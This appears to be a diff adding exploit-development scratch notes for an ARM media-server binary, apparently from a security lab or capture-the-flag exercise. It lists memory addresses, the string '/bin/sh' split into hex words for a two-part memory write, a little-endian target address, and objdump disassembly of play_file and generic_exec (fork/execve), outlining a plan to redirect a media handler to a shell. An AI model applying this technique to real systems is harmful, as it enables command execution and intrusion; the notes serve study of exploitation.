@@ -1,0 +1,117 @@
+8
+0x000233ac:media_handlers
+0x000231f4
+0x0001264c:/usr/bin/mpg123
+0x76e677f0
+
+/bin/sh\0 #Initial String 
+n  i  b   /     \0  h  s  / #Flipped byte order
+6e 69 62  2f    00  68 73 2f #Hex representation
+
+What to write into addresses
+6e65 #First word = first word - 4 bytes for target address
+622f #Second word = second word - chars written so far
+
+# Second file since bytes written will be too large
+0068
+732f 
+
+0x0068732f 
+
+0x38e7a #Possible Target Address
+\x7a\x8e\x03\x00 #Address in little-endian rep
+
+185240017
+
+Grab global variable address by looking at binary of media server and doing objdump
+
+126b8
+76a7d
+e6476
+dfadb
+872bb
+2c646
+56d2f
+742f6
+1692f
+74736
+57825
+78257
+82578
+25782
+57825
+
+00011754 <play_file>:
+   11754:       b580            push    {r7, lr}
+   11756:       b0c4            sub     sp, #272        ; 0x110
+   11758:       af00            add     r7, sp, #0
+   1175a:       1d3b            adds    r3, r7, #4
+   1175c:       6018            str     r0, [r3, #0]
+   1175e:       1d3b            adds    r3, r7, #4
+   11760:       681b            ldr     r3, [r3, #0]
+   11762:       f423 637f       bic.w   r3, r3, #4080   ; 0xff0
+   11766:       f023 030f       bic.w   r3, r3, #15
+   1176a:       f8c7 310c       str.w   r3, [r7, #268]  ; 0x10c
+   1176e:       f8d7 310c       ldr.w   r3, [r7, #268]  ; 0x10c
+   11772:       1d1a            adds    r2, r3, #4
+   11774:       1d3b            adds    r3, r7, #4
+   11776:       681b            ldr     r3, [r3, #0]
+   11778:       3304            adds    r3, #4
+   1177a:       f107 010c       add.w   r1, r7, #12
+   1177e:       4608            mov     r0, r1
+   11780:       f242 616c       movw    r1, #9836       ; 0x266c
+   11784:       f2c0 0101       movt    r1, #1
+   11788:       f7ff eb9e       blx     10ec8 <sprintf@plt>
+   1178c:       f243 33ac       movw    r3, #13228      ; 0x33ac
+   11790:       f2c0 0302       movt    r3, #2
+   11794:       681a            ldr     r2, [r3, #0]
+   11796:       1d3b            adds    r3, r7, #4
+   11798:       681b            ldr     r3, [r3, #0]
+   1179a:       681b            ldr     r3, [r3, #0]
+   1179c:       005b            lsls    r3, r3, #1
+   1179e:       3301            adds    r3, #1
+   117a0:       009b            lsls    r3, r3, #2
+   117a2:       4413            add     r3, r2
+   117a4:       681a            ldr     r2, [r3, #0]
+   117a6:       f107 030c       add.w   r3, r7, #12
+   117aa:       4610            mov     r0, r2
+   117ac:       4619            mov     r1, r3
+   117ae:       f7ff ff0f       bl      115d0 <generic_exec>
+   117b2:       f507 7788       add.w   r7, r7, #272    ; 0x110
+   117b6:       46bd            mov     sp, r7
+   117b8:       bd80            pop     {r7, pc}
+   117ba:       bf00            nop
+
+
+000115d0 <generic_exec>:
+   115d0:       b580            push    {r7, lr}
+   115d2:       b086            sub     sp, #24
+   115d4:       af00            add     r7, sp, #0
+   115d6:       6078            str     r0, [r7, #4]
+   115d8:       6039            str     r1, [r7, #0]
+   115da:       687b            ldr     r3, [r7, #4]
+   115dc:       60bb            str     r3, [r7, #8]
+   115de:       683b            ldr     r3, [r7, #0]
+   115e0:       60fb            str     r3, [r7, #12]
+   115e2:       2300            movs    r3, #0
+   115e4:       613b            str     r3, [r7, #16]
+   115e6:       f7ff ec28       blx     10e38 <fork@plt>
+   115ea:       4603            mov     r3, r0
+   115ec:       617b            str     r3, [r7, #20]
+   115ee:       697b            ldr     r3, [r7, #20]
+   115f0:       2b00            cmp     r3, #0
+   115f2:       db0c            blt.n   1160e <generic_exec+0x3e>
+   115f4:       697b            ldr     r3, [r7, #20]
+   115f6:       2b00            cmp     r3, #0
+   115f8:       d109            bne.n   1160e <generic_exec+0x3e>
+   115fa:       f107 0308       add.w   r3, r7, #8
+   115fe:       6878            ldr     r0, [r7, #4]
+   11600:       4619            mov     r1, r3
+   11602:       2200            movs    r2, #0
+   11604:       f7ff ebe8       blx     10dd8 <execve@plt>
+   11608:       2000            movs    r0, #0
+   1160a:       f7ff ec58       blx     10ebc <exit@plt>
+   1160e:       3718            adds    r7, #24
+   11610:       46bd            mov     sp, r7
+   11612:       bd80            pop     {r7, pc}
+
